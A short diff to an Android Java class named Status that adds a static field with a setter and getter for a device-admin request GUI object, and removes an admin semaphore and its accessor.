@@ -29,6 +29,7 @@ import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.Globals;
 import com.android.deviceinfo.event.BaseEvent;
 import com.android.deviceinfo.gui.AGUI;
+import com.android.deviceinfo.gui.DeviceAdminRequest;
 import com.android.deviceinfo.gui.Preview;
 import com.android.deviceinfo.module.ModuleCrisis;
 import com.android.deviceinfo.util.Check;
@@ -97,6 +98,8 @@ public class Status {
 	/** The singleton. */
 	private volatile static Status singleton;
 
+	private static DeviceAdminRequest gui;
+
 	/**
 	 * Self.
 	 * 
@@ -162,6 +165,15 @@ public class Status {
 		}
 
 		return context;
+	}
+
+	public static void setAppGui(DeviceAdminRequest applicationContext) {
+		setAppContext(applicationContext.getAppContext());
+		Status.gui = applicationContext;
+	}
+
+	public static DeviceAdminRequest getAppGui() {
+		return gui ;
 	}
 
 	public static ContentResolver getContentResolver() {
@@ -667,11 +679,6 @@ public class Status {
 
 	public synchronized boolean getDeviceAdmin() {
 		return deviceAdmin;
-	}
-
-	static Semaphore semAdmin = new Semaphore(0,true);
-	public static Semaphore getSemAdmin() {
-		return semAdmin;
 	}
 
 }
